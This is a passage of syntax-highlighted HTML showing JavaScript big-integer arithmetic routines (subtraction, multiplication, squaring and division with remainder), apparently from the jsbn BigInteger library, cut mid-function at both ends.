<span class="w">  </span><span class="k">for</span><span class="p">(</span><span class="kd">var</span><span class="w"> </span><span class="nx">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">ds</span><span class="o">+</span><span class="mf">1</span><span class="p">;</span><span class="w"> </span><span class="nx">i</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="nx">t</span><span class="p">;</span><span class="w"> </span><span class="o">++</span><span class="nx">i</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">r</span><span class="p">[</span><span class="nx">i</span><span class="o">-</span><span class="nx">ds</span><span class="o">-</span><span class="mf">1</span><span class="p">]</span><span class="w"> </span><span class="o">|=</span><span class="w"> </span><span class="p">(</span><span class="k">this</span><span class="p">[</span><span class="nx">i</span><span class="p">]</span><span class="o">&amp;</span><span class="nx">bm</span><span class="p">)</span><span class="o">&lt;&lt;</span><span class="nx">cbs</span><span class="p">;</span>
<span class="w">    </span><span class="nx">r</span><span class="p">[</span><span class="nx">i</span><span class="o">-</span><span class="nx">ds</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">this</span><span class="p">[</span><span class="nx">i</span><span class="p">]</span><span class="o">&gt;&gt;</span><span class="nx">bs</span><span class="p">;</span>
<span class="w">  </span><span class="p">}</span>
<span class="w">  </span><span class="k">if</span><span class="p">(</span><span class="nx">bs</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="mf">0</span><span class="p">)</span><span class="w"> </span><span class="nx">r</span><span class="p">[</span><span class="k">this</span><span class="p">.</span><span class="nx">t</span><span class="o">-</span><span class="nx">ds</span><span class="o">-</span><span class="mf">1</span><span class="p">]</span><span class="w"> </span><span class="o">|=</span><span class="w"> </span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nx">s</span><span class="o">&amp;</span><span class="nx">bm</span><span class="p">)</span><span class="o">&lt;&lt;</span><span class="nx">cbs</span><span class="p">;</span>
<span class="w">  </span><span class="nx">r</span><span class="p">.</span><span class="nx">t</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="nx">t</span><span class="o">-</span><span class="nx">ds</span><span class="p">;</span>
<span class="w">  </span><span class="nx">r</span><span class="p">.</span><span class="nx">clamp</span><span class="p">();</span>
<span class="p">}</span>

<span class="c1">// (protected) r = this - a</span>
<span class="kd">function</span><span class="w"> </span><span class="nx">bnpSubTo</span><span class="p">(</span><span class="nx">a</span><span class="p">,</span><span class="nx">r</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">  </span><span class="kd">var</span><span class="w"> </span><span class="nx">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">0</span><span class="p">,</span><span class="w"> </span><span class="nx">c</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">0</span><span class="p">,</span><span class="w"> </span><span class="nx">m</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">Math</span><span class="p">.</span><span class="nx">min</span><span class="p">(</span><span class="nx">a</span><span class="p">.</span><span class="nx">t</span><span class="p">,</span><span class="k">this</span><span class="p">.</span><span class="nx">t</span><span class="p">);</span>
<span class="w">  </span><span class="k">while</span><span class="p">(</span><span class="nx">i</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="nx">m</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">c</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="k">this</span><span class="p">[</span><span class="nx">i</span><span class="p">]</span><span class="o">-</span><span class="nx">a</span><span class="p">[</span><span class="nx">i</span><span class="p">];</span>
<span class="w">    </span><span class="nx">r</span><span class="p">[</span><span class="nx">i</span><span class="o">++</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">c</span><span class="o">&amp;</span><span class="k">this</span><span class="p">.</span><span class="nx">DM</span><span class="p">;</span>
<span class="w">    </span><span class="nx">c</span><span class="w"> </span><span class="o">&gt;&gt;=</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="nx">DB</span><span class="p">;</span>
<span class="w">  </span><span class="p">}</span>
<span class="w">  </span><span class="k">if</span><span class="p">(</span><span class="nx">a</span><span class="p">.</span><span class="nx">t</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="nx">t</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">c</span><span class="w"> </span><span class="o">-=</span><span class="w"> </span><span class="nx">a</span><span class="p">.</span><span class="nx">s</span><span class="p">;</span>
<span class="w">    </span><span class="k">while</span><span class="p">(</span><span class="nx">i</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="nx">t</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">      </span><span class="nx">c</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="k">this</span><span class="p">[</span><span class="nx">i</span><span class="p">];</span>
<span class="w">      </span><span class="nx">r</span><span class="p">[</span><span class="nx">i</span><span class="o">++</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">c</span><span class="o">&amp;</span><span class="k">this</span><span class="p">.</span><span class="nx">DM</span><span class="p">;</span>
<span class="w">      </span><span class="nx">c</span><span class="w"> </span><span class="o">&gt;&gt;=</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="nx">DB</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span>
<span class="w">    </span><span class="nx">c</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="nx">s</span><span class="p">;</span>
<span class="w">  </span><span class="p">}</span>
<span class="w">  </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">c</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="nx">s</span><span class="p">;</span>
<span class="w">    </span><span class="k">while</span><span class="p">(</span><span class="nx">i</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="nx">a</span><span class="p">.</span><span class="nx">t</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">      </span><span class="nx">c</span><span class="w"> </span><span class="o">-=</span><span class="w"> </span><span class="nx">a</span><span class="p">[</span><span class="nx">i</span><span class="p">];</span>
<span class="w">      </span><span class="nx">r</span><span class="p">[</span><span class="nx">i</span><span class="o">++</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">c</span><span class="o">&amp;</span><span class="k">this</span><span class="p">.</span><span class="nx">DM</span><span class="p">;</span>
<span class="w">      </span><span class="nx">c</span><span class="w"> </span><span class="o">&gt;&gt;=</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="nx">DB</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span>
<span class="w">    </span><span class="nx">c</span><span class="w"> </span><span class="o">-=</span><span class="w"> </span><span class="nx">a</span><span class="p">.</span><span class="nx">s</span><span class="p">;</span>
<span class="w">  </span><span class="p">}</span>
<span class="w">  </span><span class="nx">r</span><span class="p">.</span><span class="nx">s</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="nx">c</span><span class="o">&lt;</span><span class="mf">0</span><span class="p">)</span><span class="o">?-</span><span class="mf">1</span><span class="o">:</span><span class="mf">0</span><span class="p">;</span>
<span class="w">  </span><span class="k">if</span><span class="p">(</span><span class="nx">c</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="o">-</span><span class="mf">1</span><span class="p">)</span><span class="w"> </span><span class="nx">r</span><span class="p">[</span><span class="nx">i</span><span class="o">++</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="nx">DV</span><span class="o">+</span><span class="nx">c</span><span class="p">;</span>
<span class="w">  </span><span class="k">else</span><span class="w"> </span><span class="k">if</span><span class="p">(</span><span class="nx">c</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="mf">0</span><span class="p">)</span><span class="w"> </span><span class="nx">r</span><span class="p">[</span><span class="nx">i</span><span class="o">++</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">c</span><span class="p">;</span>
<span class="w">  </span><span class="nx">r</span><span class="p">.</span><span class="nx">t</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">i</span><span class="p">;</span>
<span class="w">  </span><span class="nx">r</span><span class="p">.</span><span class="nx">clamp</span><span class="p">();</span>
<span class="p">}</span>

<span class="c1">// (protected) r = this * a, r != this,a (HAC 14.12)</span>
<span class="c1">// &quot;this&quot; should be the larger one if appropriate.</span>
<span class="kd">function</span><span class="w"> </span><span class="nx">bnpMultiplyTo</span><span class="p">(</span><span class="nx">a</span><span class="p">,</span><span class="nx">r</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">  </span><span class="kd">var</span><span class="w"> </span><span class="nx">x</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="nx">abs</span><span class="p">(),</span><span class="w"> </span><span class="nx">y</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">a</span><span class="p">.</span><span class="nx">abs</span><span class="p">();</span>
<span class="w">  </span><span class="kd">var</span><span class="w"> </span><span class="nx">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">x</span><span class="p">.</span><span class="nx">t</span><span class="p">;</span>
<span class="w">  </span><span class="nx">r</span><span class="p">.</span><span class="nx">t</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">i</span><span class="o">+</span><span class="nx">y</span><span class="p">.</span><span class="nx">t</span><span class="p">;</span>
<span class="w">  </span><span class="k">while</span><span class="p">(</span><span class="o">--</span><span class="nx">i</span><span class="w"> </span><span class="o">&gt;=</span><span class="w"> </span><span class="mf">0</span><span class="p">)</span><span class="w"> </span><span class="nx">r</span><span class="p">[</span><span class="nx">i</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">0</span><span class="p">;</span>
<span class="w">  </span><span class="k">for</span><span class="p">(</span><span class="nx">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">0</span><span class="p">;</span><span class="w"> </span><span class="nx">i</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="nx">y</span><span class="p">.</span><span class="nx">t</span><span class="p">;</span><span class="w"> </span><span class="o">++</span><span class="nx">i</span><span class="p">)</span><span class="w"> </span><span class="nx">r</span><span class="p">[</span><span class="nx">i</span><span class="o">+</span><span class="nx">x</span><span class="p">.</span><span class="nx">t</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">x</span><span class="p">.</span><span class="nx">am</span><span class="p">(</span><span class="mf">0</span><span class="p">,</span><span class="nx">y</span><span class="p">[</span><span class="nx">i</span><span class="p">],</span><span class="nx">r</span><span class="p">,</span><span class="nx">i</span><span class="p">,</span><span class="mf">0</span><span class="p">,</span><span class="nx">x</span><span class="p">.</span><span class="nx">t</span><span class="p">);</span>
<span class="w">  </span><span class="nx">r</span><span class="p">.</span><span class="nx">s</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">0</span><span class="p">;</span>
<span class="w">  </span><span class="nx">r</span><span class="p">.</span><span class="nx">clamp</span><span class="p">();</span>
<span class="w">  </span><span class="k">if</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nx">s</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="nx">a</span><span class="p">.</span><span class="nx">s</span><span class="p">)</span><span class="w"> </span><span class="nx">BigInteger</span><span class="p">.</span><span class="nx">ZERO</span><span class="p">.</span><span class="nx">subTo</span><span class="p">(</span><span class="nx">r</span><span class="p">,</span><span class="nx">r</span><span class="p">);</span>
<span class="p">}</span>

<span class="c1">// (protected) r = this^2, r != this (HAC 14.16)</span>
<span class="kd">function</span><span class="w"> </span><span class="nx">bnpSquareTo</span><span class="p">(</span><span class="nx">r</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">  </span><span class="kd">var</span><span class="w"> </span><span class="nx">x</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="nx">abs</span><span class="p">();</span>
<span class="w">  </span><span class="kd">var</span><span class="w"> </span><span class="nx">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">r</span><span class="p">.</span><span class="nx">t</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">2</span><span class="o">*</span><span class="nx">x</span><span class="p">.</span><span class="nx">t</span><span class="p">;</span>
<span class="w">  </span><span class="k">while</span><span class="p">(</span><span class="o">--</span><span class="nx">i</span><span class="w"> </span><span class="o">&gt;=</span><span class="w"> </span><span class="mf">0</span><span class="p">)</span><span class="w"> </span><span class="nx">r</span><span class="p">[</span><span class="nx">i</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">0</span><span class="p">;</span>
<span class="w">  </span><span class="k">for</span><span class="p">(</span><span class="nx">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">0</span><span class="p">;</span><span class="w"> </span><span class="nx">i</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="nx">x</span><span class="p">.</span><span class="nx">t</span><span class="o">-</span><span class="mf">1</span><span class="p">;</span><span class="w"> </span><span class="o">++</span><span class="nx">i</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="kd">var</span><span class="w"> </span><span class="nx">c</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">x</span><span class="p">.</span><span class="nx">am</span><span class="p">(</span><span class="nx">i</span><span class="p">,</span><span class="nx">x</span><span class="p">[</span><span class="nx">i</span><span class="p">],</span><span class="nx">r</span><span class="p">,</span><span class="mf">2</span><span class="o">*</span><span class="nx">i</span><span class="p">,</span><span class="mf">0</span><span class="p">,</span><span class="mf">1</span><span class="p">);</span>
<span class="w">    </span><span class="k">if</span><span class="p">((</span><span class="nx">r</span><span class="p">[</span><span class="nx">i</span><span class="o">+</span><span class="nx">x</span><span class="p">.</span><span class="nx">t</span><span class="p">]</span><span class="o">+=</span><span class="nx">x</span><span class="p">.</span><span class="nx">am</span><span class="p">(</span><span class="nx">i</span><span class="o">+</span><span class="mf">1</span><span class="p">,</span><span class="mf">2</span><span class="o">*</span><span class="nx">x</span><span class="p">[</span><span class="nx">i</span><span class="p">],</span><span class="nx">r</span><span class="p">,</span><span class="mf">2</span><span class="o">*</span><span class="nx">i</span><span class="o">+</span><span class="mf">1</span><span class="p">,</span><span class="nx">c</span><span class="p">,</span><span class="nx">x</span><span class="p">.</span><span class="nx">t</span><span class="o">-</span><span class="nx">i</span><span class="o">-</span><span class="mf">1</span><span class="p">))</span><span class="w"> </span><span class="o">&gt;=</span><span class="w"> </span><span class="nx">x</span><span class="p">.</span><span class="nx">DV</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">      </span><span class="nx">r</span><span class="p">[</span><span class="nx">i</span><span class="o">+</span><span class="nx">x</span><span class="p">.</span><span class="nx">t</span><span class="p">]</span><span class="w"> </span><span class="o">-=</span><span class="w"> </span><span class="nx">x</span><span class="p">.</span><span class="nx">DV</span><span class="p">;</span>
<span class="w">      </span><span class="nx">r</span><span class="p">[</span><span class="nx">i</span><span class="o">+</span><span class="nx">x</span><span class="p">.</span><span class="nx">t</span><span class="o">+</span><span class="mf">1</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">1</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span>
<span class="w">  </span><span class="p">}</span>
<span class="w">  </span><span class="k">if</span><span class="p">(</span><span class="nx">r</span><span class="p">.</span><span class="nx">t</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="mf">0</span><span class="p">)</span><span class="w"> </span><span class="nx">r</span><span class="p">[</span><span class="nx">r</span><span class="p">.</span><span class="nx">t</span><span class="o">-</span><span class="mf">1</span><span class="p">]</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="nx">x</span><span class="p">.</span><span class="nx">am</span><span class="p">(</span><span class="nx">i</span><span class="p">,</span><span class="nx">x</span><span class="p">[</span><span class="nx">i</span><span class="p">],</span><span class="nx">r</span><span class="p">,</span><span class="mf">2</span><span class="o">*</span><span class="nx">i</span><span class="p">,</span><span class="mf">0</span><span class="p">,</span><span class="mf">1</span><span class="p">);</span>
<span class="w">  </span><span class="nx">r</span><span class="p">.</span><span class="nx">s</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">0</span><span class="p">;</span>
<span class="w">  </span><span class="nx">r</span><span class="p">.</span><span class="nx">clamp</span><span class="p">();</span>
<span class="p">}</span>

<span class="c1">// (protected) divide this by m, quotient and remainder to q, r (HAC 14.20)</span>
<span class="c1">// r != q, this != m.  q or r may be null.</span>
<span class="kd">function</span><span class="w"> </span><span class="nx">bnpDivRemTo</span><span class="p">(</span><span class="nx">m</span><span class="p">,</span><span class="nx">q</span><span class="p">,</span><span class="nx">r</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">  </span><span class="kd">var</span><span class="w"> </span><span class="nx">pm</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">m</span><span class="p">.</span><span class="nx">abs</span><span class="p">();</span>
<span class="w">  </span><span class="k">if</span><span class="p">(</span><span class="nx">pm</span><span class="p">.</span><span class="nx">t</span><span class="w"> </span><span class="o">&lt;=</span><span class="w"> </span><span class="mf">0</span><span class="p">)</span><span class="w"> </span><span class="k">return</span><span class="p">;</span>
<span class="w">  </span><span class="kd">var</span><span class="w"> </span><span class="nx">pt</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="nx">abs</span><span class="p">();</span>
<span class="w">  </span><span class="k">if</span><span class="p">(</span><span class="nx">pt</span><span class="p">.</span><span class="nx">t</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="nx">pm</span><span class="p">.</span><span class="nx">t</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="k">if</span><span class="p">(</span><span class="nx">q</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="kc">null</span><span class="p">)</span><span class="w"> </span><span class="nx">q</span><span class="p">.</span><span class="nx">fromInt</span><span class="p">(</span><span class="mf">0</span><span class="p">);</span>
<span class="w">    </span><span class="k">if</span><span class="p">(</span><span class="nx">r</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="kc">null</span><span class="p">)</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="nx">copyTo</span><span class="p">(</span><span class="nx">r</span><span class="p">);</span>
<span class="w">    </span><span class="k">return</span><span class="p">;</span>
<span class="w">  </span><span class="p">}</span>
<span class="w">  </span><span class="k">if</span><span class="p">(</span><span class="nx">r</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="kc">null</span><span class="p">)</span><span class="w"> </span><span class="nx">r</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">nbi</span><span class="p">();</span>
<span class="w">  </span><span class="kd">var</span><span class="w"> </span><span class="nx">y</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">nbi</span><span class="p">(),</span><span class="w"> </span><span class="nx">ts</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="nx">s</span><span class="p">,</span><span class="w"> </span><span class="nx">ms</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">m</span><span class="p">.</span><span class="nx">s</span><span class="p">;</span>
<span class="w">  </span><span class="kd">var</span><span class="w"> </span><span class="nx">nsh</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="nx">DB</span><span class="o">-</span><span class="nx">nbits</span><span class="p">(</span><span class="nx">pm</span><span class="p">[</span><span class="nx">pm</span><span class="p">.</span><span class="nx">t</span><span class="o">-</span><span class="mf">1</span><span class="p">]);</span><span class="w">    </span><span class="c1">// normalize modulus</span>
<span class="w">  </span><span class="k">if</span><span class="p">(</span><span class="nx">nsh</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="mf">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="nx">pm</span><span class="p">.</span><span class="nx">lShiftTo</span><span class="p">(</span><span class="nx">nsh</span><span class="p">,</span><span class="nx">y</span><span class="p">);</span><span class="w"> </span><span class="nx">pt</span><span class="p">.</span><span class="nx">lShiftTo</span><span class="p">(</span><span class="nx">nsh</span><span class="p">,</span><span class="nx">r</span><span class="p">);</span><span class="w"> </span><span class="p">}</span>
<span class="w">  </span><span class="k">else</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="nx">pm</span><span class="p">.</span><span class="nx">copyTo</span><span class="p">(</span><span class="nx">y</span><span class="p">);</span><span class="w"> </span><span class="nx">pt</span><span class="p">.</span><span class="nx">copyTo</span><span class="p">(</span><span class="nx">r</span><span class="p">);</span><span class="w"> </span><span class="p">}</span>
<span class="w">  </span><span class="kd">var</span><span class="w"> </span><span class="nx">ys</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">y</span><span class="p">.</span><span class="nx">t</span><span class="p">;</span>
<span class="w">  </span><span class="kd">var</span><span class="w"> </span><span class="nx">y0</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">y</span><span class="p">[</span><span class="nx">ys</span><span class="o">-</span><span class="mf">1</span><span class="p">];</span>
<span class="w">  </span><span class="k">if</span><span class="p">(</span><span class="nx">y0</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mf">0</span><span class="p">)</span><span class="w"> </span><span class="k">return</span><span class="p">;</span>
<span class="w">  </span><span class="kd">var</span><span class="w"> </span><span class="nx">yt</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">y0</span><span class="o">*</span><span class="p">(</span><span class="mf">1</span><span class="o">&lt;&lt;</span><span class="k">this</span><span class="p">.</span><span class="nx">F1</span><span class="p">)</span><span class="o">+</span><span class="p">((</span><span class="nx">ys</span><span class="o">&gt;</span><span class="mf">1</span><span class="p">)</span><span class="o">?</span><span class="nx">y</span><span class="p">[</span><span class="nx">ys</span><span class="o">-</span><span class="mf">2</span><span class="p">]</span><span class="o">&gt;&gt;</span><span class="k">this</span><span class="p">.</span><span class="nx">F2</span><span class="o">:</span><span class="mf">0</span><span class="p">);</span>
<span class="w">  </span><span class="kd">var</span><span class="w"> </span><span class="nx">d1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="nx">FV</span><span class="o">/</span><span class="nx">yt</span><span class="p">,</span><span class="w"> </span><span class="nx">d2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="mf">1</span><span class="o">&lt;&lt;</span><span class="k">this</span><span class="p">.</span><span class="nx">F1</span><span class="p">)</span><span class="o">/</span><span class="nx">yt</span><span class="p">,</span><span class="w"> </span><span class="nx">e</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">1</span><span class="o">&lt;&lt;</span><span class="k">this</span><span class="p">.</span><span class="nx">F2</span><span class="p">;</span>
<span class="w">  </span><span class="kd">var</span><span class="w"> </span><span class="nx">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">r</span><span class="p">.</span><span class="nx">t</span><span class="p">,</span><span class="w"> </span><span class="nx">j</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">i</span><span class="o">-</span><span class="nx">ys</span><span class="p">,</span><span class="w"> </span><span class="nx">t</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="nx">q</span><span class="o">==</span><span class="kc">null</span><span class="p">)</span><span class="o">?</span><span class="nx">nbi</span><span class="p">()</span><span class="o">:</span><span class="nx">q</span><span class="p">;</span>
<span class="w">  </span><span class="nx">y</span><span class="p">.</span><span class="nx">dlShiftTo</span><span class="p">(</span><span class="nx">j</span><span class="p">,</span><span class="nx">t</span><span class="p">);</span>
<span class="w">  </span><span class="k">if</span><span class="p">(</span><span class="nx">r</span><span class="p">.</span><span class="nx">compareTo</span><span class="p">(</span><span class="nx">t</span><span class="p">)</span><span class="w"> </span><span class="o">&gt;=</span><span class="w"> </span><span class="mf">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">r</span><span class="p">[</span><span class="nx">r</span><span class="p">.</span><span class="nx">t</span><span class="o">++</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">1</span><span class="p">;</span>
<span class="w">    </span><span class="nx">r</span><span class="p">.</span><span class="nx">subTo</span><span class="p">(</span><span class="nx">t</span><span class="p">,</span><span class="nx">r</span><span class="p">);</span>
<span class="w">  </span><span class="p">}</span>
<span class="w">  </span><span class="nx">BigInteger</span><span class="p">.</span><span class="nx">ONE</span><span class="p">.</span><span class="nx">dlShiftTo</span><span class="p">(</span><span class="nx">ys</span><span class="p">,</span><span class="nx">t</span><span class="p">);</span>
<span class="w">  </span><span class="nx">t</span><span class="p">.</span><span class="nx">subTo</span><span class="p">(</span><span class="nx">y</span><span class="p">,</span><span class="nx">y</span><span class="p">);</span><span class="w">    </span><span class="c1">// &quot;negative&quot; y so we can replace sub with am later</span>
<span class="w">  </span><span class="k">while</span><span class="p">(</span><span class="nx">y</span><span class="p">.</span><span class="nx">t</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="nx">ys</span><span class="p">)</span><span class="w"> </span><span class="nx">y</span><span class="p">[</span><span class="nx">y</span><span class="p">.</span><span class="nx">t</span><span class="o">++</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">0</span><span class="p">;</span>
<span class="w">  </span><span class="k">while</span><span class="p">(</span><span class="o">--</span><span class="nx">j</span><span class="w"> </span><span class="o">&gt;=</span><span class="w"> </span><span class="mf">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="c1">// Estimate quotient digit</span>
<span class="w">    </span><span class="kd">var</span><span class="w"> </span><span class="nx">qd</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="nx">r</span><span class="p">[</span><span class="o">--</span><span class="nx">i</span><span class="p">]</span><span class="o">==</span><span class="nx">y0</span><span class="p">)</span><span class="o">?</span><span class="k">this</span><span class="p">.</span><span class="nx">DM</span><span class="o">:</span><span class="nb">Math</span><span class="p">.</span><span class="nx">floor</span><span class="p">(</span><span class="nx">r</span><span class="p">[</span><span class="nx">i</span><span class="p">]</span><span class="o">*</span><span class="nx">d1</span><span class="o">+</span><span class="p">(</span><span class="nx">r</span><span class="p">[</span><span class="nx">i</span><span class="o">-</span><span class="mf">1</span><span class="p">]</span><span class="o">+</span><span class="nx">e</span><span class="p">)</span><span class="o">*</span><span class="nx">d2</span><span class="p">);</span>
<span class="w">    </span><span class="k">if</span><span class="p">((</span><span class="nx">r</span><span class="p">[</span><span class="nx">i</span><span class="p">]</span><span class="o">+=</span><span class="nx">y</span><span class="p">.</span><span class="nx">am</span><span class="p">(</span><span class="mf">0</span><span class="p">,</span><span class="nx">qd</span><span class="p">,</span><span class="nx">r</span><span class="p">,</span><span class="nx">j</span><span class="p">,</span><span class="mf">0</span><span class="p">,</span><span class="nx">ys</span><span class="p">))</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="nx">qd</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">    </span><span class="c1">// Try it out</span>
<span class="w">      </span><span class="nx">y</span><span class="p">.</span><span class="nx">dlShiftTo</span><span class="p">(</span><span class="nx">j</span><span class="p">,</span><span class="nx">t</span><span class="p">);</span>
<span class="w">      </span><span class="nx">r</span><span class="p">.</span><span class="nx">subTo</span><span class="p">(</span><span class="nx">t</span><span class="p">,</span><span class="nx">r</span><span class="p">);</span>
<span class="w">      </span><span class="k">while</span><span class="p">(</span><span class="nx">r</span><span class="p">[</span><span class="nx">i</span><span class="p">]</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="o">--</span><span class="nx">qd</span><span class="p">)</span><span class="w"> </span><span class="nx">r</span><span class="p">.</span><span class="nx">subTo</span><span class="p">(</span><span class="nx">t</span><span class="p">,</span><span class="nx">r</span><span class="p">);</span>
<span class="w">    </span><span class="p">}</span>
<span class="w">  </span><span class="p">}</span>
<span class="w">  </span><span class="k">if</span><span class="p">(</span><span class="nx">q</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="kc">null</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">r</span><span class="p">.</span><span class="nx">drShiftTo</span><span class="p">(</span><span class="nx">ys</span><span class="p">,</span><span class="nx">q</span><span class="p">);</span>
<span class="w">    </span><span class="k">if</span><span class="p">(</span><span class="nx">ts</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="nx">ms</span><span class="p">)</span><span class="w"> </span><span class="nx">BigInteger</span><span class="p">.</span><span class="nx">ZERO</span><span class="p">.</span><span class="nx">subTo</span><span class="p">(</span><span class="nx">q</span><span class="p">,</span><span class="nx">q</span><span class="p">);</span>
<span class="w">  </span><span class="p">}</span>
